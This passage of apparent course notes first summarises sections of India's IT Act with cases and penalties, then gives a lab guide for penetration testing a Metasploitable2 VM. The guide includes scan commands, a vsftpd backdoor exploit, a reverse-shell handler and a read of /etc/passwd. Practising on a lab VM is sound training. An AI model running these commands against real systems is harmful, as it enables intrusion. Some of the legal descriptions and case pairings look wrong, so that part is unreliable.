-Case: Raja Ram Pal (2012) — accused of sending offensive political emails.
-Penalty: Imprisonment up to 3 years and/or fine.
-Preventive Measures: Promote responsible online behaviour.
-Section 66B - Dishonestly Receiving Stolen Computer Resource
-Description: Punishes receiving or using stolen computer resources or data.
-Case: Orkut Data Theft Case (2010) — stolen user data sold online for scams.
-Penalty: Imprisonment up to 3 years and/or fine up to ₹1 lakh.
-Preventive Measures: Verify data sources and ensure secure storage.
-Section 66C - Identity Theft / Cyber Extortion
-Description: Fraudulent use of another person’s digital identity.
-Case: Unocoin Cyber Extortion Case — hackers accessed crypto wallets and demanded ransom.
-Penalty: Imprisonment up to 7 years and fine.
-Preventive Measures: Use two-factor authentication, secure transactions.
-Section 66D - Cheating by Personation Using Computer Resource
-Description: Online impersonation or fraud.
-Case: Krrish 3 Piracy Case — illegal distribution of the movie through fake websites.
-Penalty: Imprisonment up to 7 years and fine.
-Preventive Measures: Digital rights management (DRM) and anti-piracy awareness.
-Section 66E - Violation of Privacy / Video Voyeurism
-Description: Capturing or transmitting private images without consent.
-Case: 2015 trial room recording incident — leaked videos sparked public outrage.
-Penalty: Imprisonment up to 3 years and/or fine up to ₹2 lakh.
-Preventive Measures: Surveillance only in public areas, privacy awareness.
-Section 66F - Cyber Terrorism
-Description: Cyber activities threatening national security.
-Case: Operation Aurora (2009) — hackers targeted Indian and U.S. government systems.
-Penalty: Imprisonment for life.
-Preventive Measures: Strengthen national cybersecurity and intelligence systems.
-Section 67A - Publishing or Transmitting Obscene Material
-Description: Prohibits sexually explicit content online.
-Case: TV channel penalized for airing explicit content.
-Penalty: Imprisonment up to 7 years and fine up to ₹10 lakh.
-Preventive Measures: Content moderation and adherence to cyber ethics.
-Section 67B - Child Pornography / Abetment to Obscene Acts
-Description: Punishes content involving minors.
-Case: Tubemate App Case — app enabled illegal downloading of obscene videos.
-Penalty: Imprisonment up to 7 years and/or fine.
-Preventive Measures: Monitor online content and enforce child protection.
-Section 71 - Misuse of Personal Information
-Description: Misuse of personal data collected for legitimate purposes.
-Case: Aadhaar Data Leak — exposed sensitive citizen information.
-Penalty: Imprisonment up to 7 years and fine.
-Preventive Measures: Strong encryption, limited access, security checks.
-Section 72 - Breach of Confidentiality and Privacy
-Description: Unauthorized disclosure of confidential data.
-Case: Telecom company employees leaked customer details.
-Penalty: Imprisonment up to 7 years and/or fine.
-Preventive Measures: NDAs, monitor employee access.
-Section 73 - Publishing False Digital Signatures
-Description: Creating or using false digital signatures.
-Case: Fake digital certificates used in fraudulent finance transactions.
-Penalty: Imprisonment up to 2 years and/or fine up to ₹1 lakh.
-Preventive Measures: Verify digital signatures and secure private keys.
-Section 74 - Publication for Fraudulent Purpose
-Description: Use of fraudulent digital certificates or documents.
-Case: Corporate fraud involving forged electronic certificates.
-Penalty: Imprisonment up to 7 years and/or fine.
-Preventive Measures: Validate documents and maintain audit trails.
-Conclusion
-Cyber laws regulate online behaviour and protect individuals, organizations, and governments from digital threats. The IT Act 2000 and its 2008 amendment strengthen India’s cyber legal framework. Awareness, compliance, and cybersecurity best practices are essential for a safer digital ecosystem.
-
-8 – Penetration Testing Using Metasploit & Metasploitable
-1. Objective
-Perform safe and ethical penetration testing on Metasploitable VM.
-Use Metasploit Framework to discover, exploit, and post‑exploit vulnerabilities.
-Document findings, risks, and mitigation steps.
-Target VM: Metasploitable2 (default credentials: msfadmin:msfadmin). Tools: Metasploit, Nmap, Netcat, Nikto, SMB tools, enum4linux. Environment must be isolated (Host‑Only or NAT).
-
-2. Rules of Engagement
-Target only your own lab VMs.
-No testing on external networks.
-Follow proper ethical hacking guidelines.
-3. Lab Setup
-Attacker Machine
-Kali Linux (Metasploit preinstalled) OR Linux with Metasploit installed.
-Target
-Metasploitable2 VM (in VirtualBox or VMware).
-Ensure:
-
-Both VMs are on same internal/host‑only network.
-Metasploitable IP reachable (e.g., 192.168.56.101).
-4. Penetration Testing Methodology
-1️⃣ Reconnaissance (Nmap)
-Discover open ports & OS:
-
-nmap -sS -sV -O -p- -T4 <target_ip>
-
-Example:
-
-nmap -sS -sV -O -p- -T4 192.168.56.101
-
-2️⃣ Enumeration
-Use tools to enumerate services:
-
-nikto -h <target_ip>
-smbclient -L //<target_ip>/
-enum4linux <target_ip>
-
-3️⃣ Metasploit Module Selection
-Start Metasploit:
-
-sudo msfconsole
-
-Search for exploit modules:
-
-search vsftpd
-search samba
-search tomcat
-
-4️⃣ Exploitation
-General MSF exploitation workflow:
-
-use <module>
-show options
-set RHOSTS <target_ip>
-set RPORT <port>
-set PAYLOAD <payload>
-set LHOST <attacker_ip>
-exploit
-
-5️⃣ Post‑Exploitation
-Once Meterpreter shell obtained:
-
-getuid
-sysinfo
-ls
-cat /etc/passwd
-
-Privilege escalation if possible.
-
-6️⃣ Reporting
-Include:
-
-Commands used
-Screenshots
-Shell outputs
-Risk level
-Fix recommendations
-5. Example Command Log (Copy‑Paste Ready)
-sudo msfconsole
-nmap -sS -sV -O -p- -T4 192.168.56.101
-
-msf > search vsftpd
-msf > use exploit/unix/ftp/vsftpd_234_backdoor
-msf exploit(vsftpd_234_backdoor) > show options
-msf exploit(vsftpd_234_backdoor) > set RHOSTS 192.168.56.101
-msf exploit(vsftpd_234_backdoor) > set RPORT 21
-msf exploit(vsftpd_234_backdoor) > set LHOST 192.168.56.1
-msf exploit(vsftpd_234_backdoor) > set PAYLOAD cmd/unix/interact
-msf exploit(vsftpd_234_backdoor) > exploit
-
-msf > use auxiliary/scanner/http/title
-msf auxiliary(scanner/http/title) > set RHOSTS 192.168.56.101
-msf auxiliary(scanner/http/title) > run
-
-msf > use exploit/multi/handler
-msf exploit(multi/handler) > set PAYLOAD linux/x86/meterpreter/reverse_tcp
-msf exploit(multi/handler) > set LHOST 192.168.56.1
-msf exploit(multi/handler) > exploit -j
-
-6. Findings (Sample Table)
-ID	Vulnerability	Service	Impact	Evidence	Severity
-1	Default credentials (msfadmin)	SSH	Unauthorized access	ssh msfadmin@target	Medium
-2	vsftpd 2.3.4 Backdoor	FTP 21	Remote Command Execution	Metasploit shell	High
-3	Outdated Samba	SMB	Info leakage / RCE	smbclient -L + MSF modules	High
-4	Vulnerable web apps	HTTP	Directory traversal / SQLi	Nikto results	Medium
-7. Risk Ratings & Recommendations
-High‑Risk Issues (RCE, weak creds)
-Patch/update services.
-Remove default accounts.
-Disable unneeded services (FTP, Telnet).
-Medium‑Risk Issues
-Apply strong authentication.
-Implement firewall segmentation.
-General Security Fixes
-Apply OS + service updates.
-Enforce password policies.
-Enable monitoring / IDS.
-8. Executive Summary
-A penetration test was conducted against Metasploitable using Metasploit. Multiple critical vulnerabilities were exploited, including a vsftpd backdoor providing a remote shell. This environment is intentionally vulnerable for training, but the findings reflect real‑world security failures such as outdated services, weak credentials, and misconfiguration.
-
-9. Appendix – Evidence Collection
-Include in your final submission:
-
-Nmap scan results
-
-Metasploit console logs
-
-Screenshots of:
-
-Successful exploits
-Meterpreter session
-Privilege escalation
-File extraction (e.g., /etc/passwd)
